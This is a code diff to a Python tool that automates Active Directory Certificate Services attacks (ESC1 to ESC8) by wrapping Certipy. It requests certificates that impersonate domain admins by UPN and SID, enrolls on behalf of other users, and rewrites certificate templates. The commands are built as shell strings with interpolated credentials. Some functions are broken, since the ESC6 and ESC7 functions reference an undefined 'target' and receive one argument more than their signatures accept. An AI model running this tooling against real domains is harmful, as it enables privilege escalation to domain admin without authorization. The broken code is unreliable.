@@ -4,7 +4,7 @@ import subprocess
 import glob
 import shutil
 from datetime import datetime
-from general_utils import log_command
+from general_utils import log_command, current_date
 import re
 
 def describe_esc(esc):
@@ -30,23 +30,12 @@ def run_certipy_find(args):
         return
 
     user_at_domain = f"{args.domain_user}@{args.domain}"
-    cmd = f"certipy.pyz find -enabled -u {user_at_domain} -p {args.domain_pass} -dc-ip {args.dc_ip}"
+    cmd = f"certipy.pyz find -enabled -u {user_at_domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -stdout | tee ActiveDirectory/ADCS/{current_date}_FindResults.txt"
     start = datetime.now()
     print(f"\033[92m[*] Running: {cmd}\033[0m")
-    result = subprocess.run(cmd, shell=True)
+    result = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     end = datetime.now()
     log_command(cmd, start, end, args.dc_ip, "Success" if result.returncode == 0 else "Failed")
-
-    output_dir = "ActiveDirectory/ADCS"
-    os.makedirs(output_dir, exist_ok=True)
-
-    matching_files = glob.glob("*Certipy*.json") + glob.glob("*Certipy*.txt")
-    for file in matching_files:
-        try:
-            shutil.move(file, os.path.join(output_dir, os.path.basename(file)))
-            print(f"[+] Moved {file} to {output_dir}/")
-        except Exception as e:
-            print(f"[-] Failed to move {file}: {e}")
 
 def find_esc_vulns(certipy_dir):
     certipy_dir = os.path.expanduser(certipy_dir)
@@ -118,37 +107,37 @@ def find_esc_vulns(certipy_dir):
         return None
 
 # === ESC Handlers ===
-def handle_ESC1(args, selected_template, selected_admin):
-    certipy_ESC1(args, selected_template, selected_admin)
+def handle_ESC1(args, selected_template, selected_admin, target):
+    certipy_ESC1(args, selected_template, selected_admin, target)
 
-def handle_ESC2(args, selected_template, selected_admin):
+def handle_ESC2(args, selected_template, selected_admin, target):
     q = input(f"\033[93m[?] ESC2 can be exploited 2 ways: ESC1-style(e), on-behalf-of(o):\033[0m ").lower()
     if q == "e":
-        certipy_ESC1(args, selected_template, selected_admin)
+        certipy_ESC1(args, selected_template, selected_admin, target)
     elif q == "o":
-        certipy_ESC2(args, selected_template, selected_admin)
+        certipy_ESC2(args, selected_template, selected_admin, target)
 
-def handle_ESC3(args, selected_template, selected_admin):
-    certipy_ESC2(args, selected_template, selected_admin)
+def handle_ESC3(args, selected_template, selected_admin, target):
+    certipy_ESC2(args, selected_template, selected_admin, target)
 
-def handle_ESC4(args, selected_template, selected_admin):
-    certipy_ESC4(args, selected_template, selected_admin)
+def handle_ESC4(args, selected_template, selected_admin, target):
+    certipy_ESC4(args, selected_template, selected_admin, target)
 
-def handle_ESC5(args, selected_template, selected_admin):
-    certipy_ESC5(args, selected_template, selected_admin)
+def handle_ESC5(args, selected_template, selected_admin, target):
+    certipy_ESC5(args, selected_template, selected_admin, target)
 
-def handle_ESC6(args, selected_template, selected_admin):
-    certipy_ESC6(args, selected_template)
+def handle_ESC6(args, selected_template, selected_admin, target):
+    certipy_ESC6(args, selected_template, target)
 
-def handle_ESC7(args, selected_template, selected_admin):
-    certipy_ESC7(args, selected_template)
+def handle_ESC7(args, selected_template, selected_admin, target):
+    certipy_ESC7(args, selected_template, target)
 
-def handle_ESC8(args, selected_template, selected_admin):
-    certipy_ESC8(args, selected_template, selected_admin)
+def handle_ESC8(args, selected_template, selected_admin, target):
+    certipy_ESC8(args, selected_template, selected_admin, target)
 
 
 # === ESC Exploits ===
-def certipy_ESC1(args, selected_template, selected_admin):
+def certipy_ESC1(args, selected_template, selected_admin, target):
     if not selected_template or not selected_admin:
         print("\033[91m[-] Missing template or domain admin. Skipping cert request.\033[0m")
         return
@@ -156,35 +145,28 @@ def certipy_ESC1(args, selected_template, selected_admin):
     template_name = selected_template[1]
     ca_name = selected_template[2]
     admin_account, sid = selected_admin.split(":")
-
-    command = [
-        "certipy.pyz", "req",
-        "-u", f"{args.domain_user}@{args.domain}",
-        "-p", args.domain_pass,
-        "-upn", admin_account.strip(),
-        "-template", template_name,
-        "-ca", ca_name,
-        "-dc-ip", args.dc_ip,
-        "-sid", sid.strip()
-    ]
-
+    upn = admin_account.strip()
+    cmdsid = sid.strip()
+    
+    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
     print(f"\n[*] Requesting certificate using Certipy template '{template_name}' for user '{admin_account.strip()}'...\n")
-    subprocess.run(command)
+    print(f"[*] Running: {command}")
+    subprocess.run(command, shell=True)
 
-def certipy_ESC2(args, selected_template, selected_admin):
+def certipy_ESC2(args, selected_template, selected_admin, target):
     template_name = selected_template[1]
     ca_name = selected_template[2]
     admin_account, sid = selected_admin.split(":")
 
-    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -template {template_name} -ca {ca_name} -sid {sid.strip()}"
+    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {sid.strip()}"
     print(f"\033[96mESC2 attack with: {esc2_cmd}\033[0m")
     subprocess.call(esc2_cmd, shell=True)
 
-    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -template user -ca {ca_name} -pfx {args.domain_user}.pfx -on-behalf-of {args.domain}\\{admin_account.strip()} -sid {sid.strip()}"
+    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template user -ca {ca_name} -pfx {args.domain_user}.pfx -on-behalf-of {args.domain}\\{admin_account.strip()} -sid {sid.strip()}"
     print(f"\033[96mRunning {esc2_pfx_cmd}\033[0m")
     subprocess.call(esc2_pfx_cmd, shell=True)
 
-def certipy_ESC4(args, selected_template, selected_admin):
+def certipy_ESC4(args, selected_template, selected_admin, target):
     template_name = selected_template[1]
     ca_name = selected_template[2]
 
@@ -194,7 +176,7 @@ def certipy_ESC4(args, selected_template, selected_admin):
         "-u", f"{args.domain_user}@{args.domain}",
         "-p", args.domain_pass,
         "-template", template_name,
-        "-dc-ip", args.dc_ip,
+        "-target", target,
         "-save-configuration", "ESC4Save",
         "-write-default-configuration",
         "-force"
@@ -203,21 +185,21 @@ def certipy_ESC4(args, selected_template, selected_admin):
     subprocess.call(esc4_write)
 
     # Run ESC1 against modified template
-    certipy_ESC1(args, selected_template, selected_admin)
+    certipy_ESC1(args, selected_template, selected_admin, target)
 
     # Revert config
     esc4_revert = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -template {template_name} -write-configuration ESC4Save.json"
     print(f"\033[96mRunning {esc4_revert}\033[0m")
     subprocess.run(esc4_revert, shell=True)
 
-def certipy_ESC5(args, selected_template, selected_admin):
+def certipy_ESC5(args, selected_template, selected_admin, target):
     print("[!] ESC5 exploitation not implemented.")
 
 def certipy_ESC6(args, selected_template):
-    print("[!] ESC6 exploitation not implemented.")
+    print("[!] ESC6 exploitation not implemented.", target)
 
 def certipy_ESC7(args, selected_template):
-    print("[!] ESC7 exploitation not implemented.")
+    print("[!] ESC7 exploitation not implemented.", target)
 
-def certipy_ESC8(args, selected_template, selected_admin):
+def certipy_ESC8(args, selected_template, selected_admin, target):
     print("[!] ESC8 exploitation not implemented.")
